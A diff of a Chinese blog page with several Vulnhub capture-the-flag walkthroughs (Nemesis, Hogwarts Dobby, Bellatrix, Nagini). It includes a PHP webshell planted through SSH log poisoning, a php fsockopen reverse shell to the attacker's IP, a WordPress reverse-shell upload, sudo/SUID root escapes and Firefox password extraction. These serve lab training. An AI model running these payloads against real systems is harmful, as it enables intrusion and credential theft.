+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/20.png" alt="image-"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先确定key为key[89, 65]</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">affine_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([ <span class="built_in">chr</span>((( key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>] ) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) ])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">      affine_text=<span class="string">&quot;FUN&quot;</span></span><br><span class="line">      <span class="keyword">for</span> key0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">          <span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">              encrypt_text = affine_encrypt(affine_text, [key0, key1])</span><br><span class="line">              <span class="keyword">if</span> encrypt_text == <span class="string">&quot;QZA&quot;</span>:</span><br><span class="line">                  <span class="built_in">print</span>(key0,key1)</span><br><span class="line">                  sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密程序，得到password为ENCRYPTIONISFUNPASSWORD</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">affine_decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">  text = []</span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> cipher:</span><br><span class="line">      b = <span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">          result = (<span class="number">65</span> + x*<span class="number">89</span> - b) % <span class="number">26</span></span><br><span class="line">          <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">              text.append(<span class="built_in">chr</span>(x + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(text))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">  affine_encrypted_text = <span class="string">&quot;FAJSRWOXLAXDQZAWNDDVLSU&quot;</span></span><br><span class="line">  affine_decrypt(affine_encrypted_text)</span><br></pre></td></tr></table></figure>
+
+<p>3.再进行文件权限查看，发现可以使用nano进行提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/21.png" alt="image-"></p>
+<p>4.在gtfobins上查询nano提权方式，成功提权到root：</p>
+<p><img src="/2022/08/15/IA-Nemesis/22.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su carlos，在thanos用户下登录到carlos，password是ENCRYPTIONISFUNPASSWORD</span><br><span class="line">sudo -u root /bin/nano /opt/priv</span><br><span class="line">ctrl+r,ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/23.png" alt="image-"></p>
+<p>5.在&#x2F;root目录下可以发现第三个flag，即root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/24.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Dobby/">
+                Hogwarts Dobby
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-dobby">HOGWARTS: DOBBY</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-dobby">名称：Hogwarts: Dobby</span></h4><h4><span id="发布日期2020118">发布日期：2020.11.8</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;proof.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名dobbyova">文件名：dobby.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsdobbyova">下载地址：</span></h4><h4><span id="md5-11b9fd40b70344a71b432a608ee640ab">MD5: 11B9FD40B70344A71B432A608EE640AB</span></h4><h4><span id="sha1-68110b92fd58d6a4c8f0cdbe169e29259ac797a6">SHA1: 68110B92FD58D6A4C8F0CDBE169E29259AC797A6</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机dobby和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了80端口，访问主页，还是apache的默认页，但源码有路径提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.126 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，&#x2F;log目录值得关注一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.126 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="网页发现">网页发现</span></h3><blockquote>
+<p>1.访问&#x2F;alohomora目录，发现Draco用户的密码提示：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/7.png" alt="image-"></p>
+<p>2.访问&#x2F;log目录，发现直接提示了一个密码和路径：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/8.png" alt="image-"></p>
+<p>3.继续访问&#x2F;DiagonAlley，发现一串brainfuck编码，且这个页面是用wordpress搭建的：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/9.png" alt="image-"></p>
+<p>4.将brainfuck字串解码，但解出来是乱码：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/10.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress后台登录写入shell">Wordpress后台登录，写入shell</span></h3><blockquote>
+<p>1.再从wordpress入手，用wpscan进行扫描，但没有过多问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.126/DiagonAlley --detection-mode aggressive</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/11.png" alt="image-"></p>
+<p>2.进入wp-login.php后台页，我们有用户draco，而提示他的马的名字slytherin就是密码：</p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/12.png" alt="image-"></p>
+<p>3.进入wordpress后台后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行ip及端口修改，在Apariencia-Editor de temas-Error 404页写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/13.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/14.png" alt="image-"></p>
+<p>4.在kali开启对应端口监听，访问&#x2F;DiagonAlley目录下不存在页即可触发shell，再利用python构建交互式shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/15.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Dobby/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查找有suid的文件，发现find：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | grep usr/bin</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/17.png" alt="image-"></p>
+<p>2.利用find可以直接提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">vi proof.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Dobby/19.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Bellatrix/">
+                Hogwarts Bellatrix
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
+<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
+<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
+<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
+<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
+<p>4.可以登录到lestrange用户：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
+<p>2.直接写入，提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/08/Harrypotter-Na/">
                 Hogwarts Nagini
             </a>
@@ -215,7 +710,7 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](25.png)</span><br></pre></td></tr></table></figure>
 <p>cd &#x2F;home&#x2F;hermoine&#x2F;bin<br>.&#x2F;su_cp -p &#x2F;home&#x2F;snape&#x2F;authorized_keys &#x2F;home&#x2F;hermoine&#x2F;.ssh&#x2F;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](26.png)</span><br></pre></td></tr></table></figure>
-<p>Kali:<br>ssh <a href="mailto:&#x68;&#101;&#x72;&#x6d;&#x6f;&#x69;&#110;&#101;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x35;&#x36;&#x2e;&#49;&#x30;&#x35;">&#x68;&#101;&#x72;&#x6d;&#x6f;&#x69;&#110;&#101;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x35;&#x36;&#x2e;&#49;&#x30;&#x35;</a> -i .ssh&#x2F;id_rsa</p>
+<p>Kali:<br>ssh <a href="mailto:&#x68;&#101;&#114;&#x6d;&#111;&#x69;&#x6e;&#101;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#53;">&#x68;&#101;&#114;&#x6d;&#111;&#x69;&#x6e;&#101;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#53;</a> -i .ssh&#x2F;id_rsa</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5.这个时候我们就可以去/root目录下查看horcrux2.txt这个文件，同样是用base64解密： </span><br><span class="line">![image-](27.png)</span><br><span class="line"></span><br><span class="line">### root提权</span><br><span class="line">1.我们可以在.mozilla/firefox/g2mhbq0o.default/目录下发现浏览器的登录信息，则考虑使用读取浏览器用户名和密码的工具firepwd，在hermoine开启一个http服务，传输要解密的文件给kali，可以爆出root的密码：</span><br></pre></td></tr></table></figure>
 <p>hermoine:<br>cd .mozilla&#x2F;firefox&#x2F;g2mhbq0o.default&#x2F;<br>ls -al</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](28.png)</span><br></pre></td></tr></table></figure>
@@ -226,100 +721,6 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <p><img src="/2022/08/08/Harrypotter-Na/29.png" alt="image-"></p>
 <p>2.进行root登录，在&#x2F;home目录下能找到最后一个flag，即horcrux3.txt：<br><img src="/2022/08/08/Harrypotter-Na/30.png" alt="image-"></p>
 <p><img src="/2022/08/08/Harrypotter-Na/31.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Hogwarts-Bellatrix/">
-                Hogwarts Bellatrix
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
